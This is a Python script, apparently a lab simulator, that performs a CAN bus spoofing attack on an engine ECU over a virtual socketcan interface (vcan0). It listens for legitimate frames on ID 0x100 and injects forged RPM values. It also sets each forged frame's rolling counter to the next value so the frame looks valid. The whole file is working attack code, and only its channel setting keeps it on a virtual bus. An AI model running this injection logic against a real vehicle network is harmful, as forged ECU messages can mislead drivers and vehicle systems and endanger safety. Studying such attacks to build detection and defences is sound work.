import can
import time


# ============================================================
# CAN SPOOFING ATTACK SIMULATOR
# ============================================================

CAN_ID_ENGINE = 0x100

bus = can.Bus(
    interface="socketcan",
    channel="vcan0"
)


print("=" * 60)
print(" CAN SPOOFING ATTACK SIMULATOR")
print("=" * 60)
print("Target       : Engine ECU")
print("CAN ID       : 0x100")
print("Attack type  : RPM spoofing")
print()
print("The attacker listens for legitimate Engine ECU frames")
print("and injects a fake RPM using the next counter value.")
print()
print("Press CTRL+C to stop.")
print("=" * 60)
print()


try:

    while True:

        # ----------------------------------------------------
        # Wait for a legitimate Engine ECU frame
        # ----------------------------------------------------

        message = bus.recv(timeout=2.0)

        if message is None:
            continue

        # Only target Engine ECU messages
        if message.arbitration_id != CAN_ID_ENGINE:
            continue

        # Engine frame must contain:
        # 2 bytes RPM + 1 byte counter
        if len(message.data) != 3:
            continue


        # ----------------------------------------------------
        # Decode legitimate message
        # ----------------------------------------------------

        legitimate_rpm = int.from_bytes(
            message.data[0:2],
            byteorder="big"
        )

        legitimate_counter = message.data[2]


        # ----------------------------------------------------
        # Create next valid-looking counter
        # ----------------------------------------------------

        spoof_counter = (
            legitimate_counter + 1
        ) % 256


        # ----------------------------------------------------
        # Create abnormal RPM
        # ----------------------------------------------------
        #
        # We deliberately choose a value far from the
        # legitimate RPM.
        #

        if legitimate_rpm <= 1500:

            spoof_rpm = 3000

        else:

            spoof_rpm = 1000


        # ----------------------------------------------------
        # Build spoofed CAN payload
        # ----------------------------------------------------

        rpm_data = spoof_rpm.to_bytes(
            2,
            byteorder="big"
        )

        counter_data = bytes([
            spoof_counter
        ])


        spoofed_message = can.Message(
            arbitration_id=CAN_ID_ENGINE,
            data=rpm_data + counter_data,
            is_extended_id=False
        )


        # ----------------------------------------------------
        # Send spoofed frame
        # ----------------------------------------------------

        bus.send(spoofed_message)


        print(
            f"SPOOF -> "
            f"Legitimate RPM={legitimate_rpm} | "
            f"Legitimate Counter={legitimate_counter} | "
            f"Fake RPM={spoof_rpm} | "
            f"Fake Counter={spoof_counter}"
        )


        # Small delay before next observation
        time.sleep(0.5)


except KeyboardInterrupt:

    print("\nSpoofing simulation stopped.")


finally:

    bus.shutdown()
